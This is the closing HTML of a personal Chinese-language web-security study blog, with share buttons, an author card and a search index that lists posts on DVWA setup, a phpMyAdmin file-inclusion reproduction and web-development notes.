            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/07/sqlSum/"
                    title="Share on Twitter"
                    aria-label="Share on Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/07/sqlSum/"
                    title="Share on Google+"
                    aria-label="Share on Google+"
                >
                    <i class="fab fa-google-plus" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


                </div>
                
    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
        <i id="btn-close-shareoptions" class="fa fa-times"></i>
        <ul class="share-options">
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/07/sqlSum/"
                        aria-label="Share on Facebook"
                    >
                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/07/sqlSum/"
                        aria-label="Share on Twitter"
                    >
                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/07/sqlSum/"
                        aria-label="Share on Google+"
                    >
                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>Share on Google+</span>
                    </a>
                </li>
            
        </ul>
    </div>


            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-times"></i>
        </div>
        
            <img id="about-card-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
        
            <h4 id="about-card-name">han</h4>
        
            <div id="about-card-bio"><p>life and code</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>Web Security</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker-alt"></i>
                <br/>
                Beijing, China
            </div>
        
    </div>
</div>

        
            <div id="algolia-search-modal" class="modal-container">
    <div class="modal">
        <div class="modal-header">
            <span class="close-button"><i class="fa fa-times"></i></span>
            <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
                <span class="searchby-algolia-text text-color-light text-small">by</span>
                <img class="searchby-algolia-logo" src="/assets/images/logo-algolia-nebula-blue-full.svg">
            </a>
            <i class="search-icon fa fa-search"></i>
            <form id="algolia-search-form">
                <input type="text" id="algolia-search-input" name="search"
                    class="form-control input--large search-input" placeholder="Search "
                    />
            </form>
        </div>
        <div class="modal-body">
            <div class="no-result text-color-light text-center">no post found</div>
            <div class="results">
                
                <div class="media">
                    
                    <div class="media-left">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/28/dvwa-deploy/"
                            aria-label=": dvwa 在 CentOS 部署"
                        >
                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/image-gallery-showcase/city-140.jpg" width="90" height="90"/>
                        </a>
                    </div>
                    
                    <div class="media-body">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/28/dvwa-deploy/"
                            aria-label=": dvwa 在 CentOS 部署"
                        >
                            <h3 class="media-heading">dvwa 在 CentOS 部署</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Jul 28, 2019
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: CentOS7部署DVWA</p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-left">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/28/phpmyadmin-bug/"
                            aria-label=": phpmyadmin文件包含漏洞复现"
                        >
                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg" width="90" height="90"/>
                        </a>
                    </div>
                    
                    <div class="media-body">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/28/phpmyadmin-bug/"
                            aria-label=": phpmyadmin文件包含漏洞复现"
                        >
                            <h3 class="media-heading">phpmyadmin文件包含漏洞复现</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Jul 28, 2019
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: phpmyadmin4.8漏洞演示</p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-left">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/29/note11/"
                            aria-label=": 笔记11"
                        >
                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/elements-showcase/vintage-140.jpg" width="90" height="90"/>
                        </a>
                    </div>
                    
                    <div class="media-body">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/29/note11/"
                            aria-label=": 笔记11"
                        >
                            <h3 class="media-heading">笔记11</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Jul 29, 2019
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 本文档主要记录2019/07/29学习的主要内容</p>
<a id="more"></a></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-left">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/29/week2sum/"
                            aria-label=": 第二周总结"
                        >
                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
                        </a>
                    </div>
                    
                    <div class="media-body">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/29/week2sum/"
                            aria-label=": 第二周总结"
                        >
                            <h3 class="media-heading">第二周总结</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Jul 29, 2019
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 对第二周学习的内容进行总结，<code>note6-note10</code>的笔记。</p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-left">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/29/simpleapp/"
                            aria-label=": markdown语法"
                        >
                            <img class="media-image" src="https://images.pexels.com/photos/1367188/pexels-photo-1367188.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
                        </a>
                    </div>
                    
                    <div class="media-body">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/29/simpleapp/"
                            aria-label=": markdown语法"
                        >
                            <h3 class="media-heading">markdown语法</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Jul 29, 2019
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 用typora写markdown文档的语法</p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-left">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/30/stage1-exam/"
                            aria-label=": stage1知识盲点"
                        >
                            <img class="media-image" src="https://images.unsplash.com/photo-1564414872027-5ae7dac9a76f?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=700&amp;q=80" width="90" height="90"/>
                        </a>
                    </div>
                    
                    <div class="media-body">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/30/stage1-exam/"
                            aria-label=": stage1知识盲点"
                        >
                            <h3 class="media-heading">stage1知识盲点</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Jul 30, 2019
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 知识盲点总结</p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-left">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/30/note12/"
                            aria-label=": 笔记12"
                        >
                            <img class="media-image" src="https://images.unsplash.com/photo-1561363702-e07252da3399?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80" width="90" height="90"/>
                        </a>
                    </div>
                    
                    <div class="media-body">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/07/30/note12/"
                            aria-label=": 笔记12"
                        >
                            <h3 class="media-heading">笔记12</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Jul 30, 2019
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 初学HTML</p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-left">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/08/01/note13/"
                            aria-label=": 笔记13"
                        >
                            <img class="media-image" src="https://images.unsplash.com/photo-1563930365798-3014c158554f?ixlib=rb-1.2.1&amp;auto=format&amp;fit=crop&amp;w=500&amp;q=60" width="90" height="90"/>
                        </a>
                    </div>
                    
                    <div class="media-body">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/08/01/note13/"
                            aria-label=": 笔记13"
                        >
                            <h3 class="media-heading">笔记13</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Aug 1, 2019
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 初探CSS+JS</p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-left">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/08/01/note14/"
                            aria-label=": 笔记14"
                        >
                            <img class="media-image" src="https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
                        </a>
                    </div>
                    
                    <div class="media-body">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/08/01/note14/"
                            aria-label=": 笔记14"
                        >
                            <h3 class="media-heading">笔记14</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Aug 1, 2019
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: JS BOM和jQuery，以及php环境的搭建</p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
                <div class="media">
                    
                    <div class="media-left">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/08/03/note15/"
                            aria-label=": 笔记15"
                        >
                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
                        </a>
                    </div>
                    
                    <div class="media-body">
                        <a
                            class="link-unstyled"
                            href="http://yoursite.com/2019/08/03/note15/"
                            aria-label=": 笔记15"
                        >
                            <h3 class="media-heading">笔记15</h3>
                        </a>
                        <span class="media-meta">
                            <span class="media-date text-small">
                                
                                    Aug 3, 2019
                                
                            </span>
                        </span>
                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: php基础语法和变量</p></div>
                    </div>
                    <div style="clear:both;"></div>
                    <hr>
                </div>
                
            </div>
        </div>
        <div class="modal-footer">
            <p class="results-count text-medium"
                data-message-zero="no post found"
                data-message-one="1 post found"
                data-message-other="{n} posts found">
                61 posts found
            </p>
        </div>
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-miftf8se61zspg5fcsur8f7clgivo7gvevo5wqy4l6pigmbhx9ujvpue2enp.min.js"></script>
<!--SCRIPTS END-->


    



    <script src="/assets/js/moment-with-locales.js"></script>
    <script src="/assets/js/algoliasearch.js"></script>
    <script>
      var algoliaClient = algoliasearch('QHU2Y8U611', 'c66d405f4a2145e747c10a811d8acae2');
      var algoliaIndex = algoliaClient.initIndex('tranquilpeak');
    </script>


    </body>
</html>
